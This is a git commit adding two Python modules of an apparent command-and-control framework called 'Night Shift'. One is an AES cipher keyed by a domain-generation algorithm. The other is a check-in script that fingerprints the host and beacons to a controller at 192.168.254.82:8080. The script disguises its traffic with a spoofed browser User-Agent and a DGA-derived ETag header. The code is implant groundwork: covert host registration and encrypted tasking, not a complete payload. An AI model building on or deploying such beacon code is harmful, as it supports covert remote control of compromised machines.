70e8804d44f4b066466b96e653d8e6874137296f
Sean Frank <78367642+seangfrank0474@users.noreply.github.com>
2021-02-08 14:05:25 -0500

    Add files via upload

---
+++ nightshift_cipher.py
@@ -0,0 +1,68 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Cipher and encodeing for Night Shift communication
+
+import base64
+import os
+import sys
+import hashlib
+
+from Crypto.Cipher import AES
+from nightshift_dga import NightShift_DGA
+
+class NightShift_Cipher():
+	
+    def _getcipher(self):
+        key_var = "key"
+        get_key = NightShift_DGA()
+        enc_key = get_key.ns_dga_algorithm(key_var)
+        #enc_key = 'TEST-hMP#rgzt4!*EL7#psC@pgayB!G3'
+        cipher = AES.new(enc_key)
+        blksz = 16
+        padding = '{'
+        pad = lambda s: s + (blksz - len(s) % blksz) * padding
+        return cipher, pad, padding
+    
+    def encrypt(self,clear_text):
+        cipher = self._getcipher()[0]
+        pad = self._getcipher()[1]
+        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s))).decode('ascii')
+        encoded = EncodeAES(cipher, clear_text)
+        return encoded
+    
+    def decrypt(self,enc_passwd):
+        cipher = self._getcipher()[0]
+        padding = self._getcipher()[2]
+        DecodeAES = lambda c, b: c.decrypt(base64.b64decode(bytes(b, 'utf-8'))).decode('ascii').rstrip(padding)
+        decoded = DecodeAES(cipher, enc_passwd)
+        return decoded
+
+    def hash_keys_hosts(self,keys_hosts):
+        host_hash = hashlib.sha256(keys_hosts.encode('utf-8')).hexdigest()
+        return host_hash
+
+    def run(self):
+        if sys.argv[1] == '-e':
+            clear_text = str(sys.argv[2])
+            e_d_passwd = self.encrypt(clear_text)
+            return e_d_passwd
+        elif sys.argv[1] == '-d':
+            enc_passwd = str(sys.argv[2])
+            e_d_passwd = self.decrypt(enc_passwd)
+            return e_d_passwd
+        elif sys.argv[1] == '-h':
+            keys_hosts = str(sys.argv[2])
+            e_d_passwd = self.hash_keys_hosts(keys_hosts)
+            return e_d_passwd
+        else:
+            print('-e <string> to encrypt\n-d <encrypted string> to decrypt\n-i <hostname+ostype> (i.e. examplehostposix or examplehostnt or output key from nightshift_dga.py)')
+            sys.exit(1)
+				
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        e_d_output = NightShift_Cipher().run()
+        print('Here is the encoded/decoded string/host id - {0}'.format(e_d_output))
+        sys.exit(0)
+    else:
+        print('-e <string> to encrypt\n-d <encrypted string> to decrypt\n-h <hostname+ostype or DGA key> (i.e. examplehostposix or examplehostnt or output key from nightshift_dga.py)')
+        sys.exit(1)
---
+++ ns_collector.py
@@ -0,0 +1,87 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import aiohttp
+import asyncio
+import hashlib
+import os
+import sys
+import json
+import string
+import socket
+
+from nightshift_dga import NightShift_DGA
+from nightshift_cipher import NightShift_Cipher
+
+class NightShift_Init_Check():
+    
+    def ns_init_check(self):
+        init_json_path = 'ns_init_call.json'
+        if os.path.exists(init_json_path):
+            ns_f_check = True
+            with open(init_json_path) as ns_init_f:
+                ns_init_data = json.load(ns_init_f)
+                host_data_ns = ns_init_data.get('host_data')
+                ns_w_check = host_data_ns.get('ns_init')
+                if ns_f_check == True and ns_w_check == True:
+                    # print("cool, let's go for a spin")
+                    return True
+                else:
+                    # print("well we have work to do")
+                    loop = asyncio.get_event_loop()
+                    response = loop.run_until_complete(self.ns_init_call(init_json_path))
+                    return response
+
+        else:
+            loop = asyncio.get_event_loop()
+            response = loop.run_until_complete(self.ns_init_call(init_json_path))
+            return response
+
+    async def ns_init_call(self,init_json_path):
+        try:
+            async with aiohttp.ClientSession() as session:
+                get_key = NightShift_DGA()
+                get_hash = NightShift_Cipher()
+                # Host Info
+                host_name_f = socket.gethostname()
+                os_type_f =  os.name
+                host_os_to_hash = str(host_name_f + os_type_f)
+                host_os_hashed_f = get_hash.hash_keys_hosts(host_os_to_hash)
+                # Server Contact Info
+                url = 'http://192.168.254.82:8080'
+                header_key = get_key.ns_dga_algorithm('key')
+                hash_key = get_hash.hash_keys_hosts(header_key)
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/84.0',
+                    'ETag': hash_key
+                    }
+                # print(header_key)
+                # print(hash_key)
+                # print(headers)
+                async with session.get(url, headers=headers) as response:
+                    # print("Status:", response.status)
+                    # print("Content-type:", response.headers['content-type'])
+                    html = await response.text()
+                    # print("Body:", html, "...")
+        except aiohttp.client_exceptions.ClientConnectorError:
+            print("Connection has been refused", file=sys.stderr)
+            sys.exit(1)
+        with open(init_json_path, 'w') as ns_init_w:
+            if html == "OK":
+                ns_init_f = True
+            else:
+                ns_init_f = False
+            ns_init_config_f = { "host_data": { "os_type": os_type_f, "host_name": host_name_f, "ns_init": ns_init_f }, "host_hash": host_os_hashed_f }
+            # print(ns_init_config_f)
+            json.dump(ns_init_config_f, ns_init_w)
+            # print(json.dumps(ns_init_config_f, indent = 4, sort_keys=True))
+        return ns_init_f
+
+    def run(self):
+        ns_check = self.ns_init_check()
+        return ns_check
+        
+if __name__ == "__main__":
+    ns_check = NightShift_Init_Check().run()
+    print('Here is the Night Shift init config check - {0}'.format(ns_check))
+    sys.exit(0)
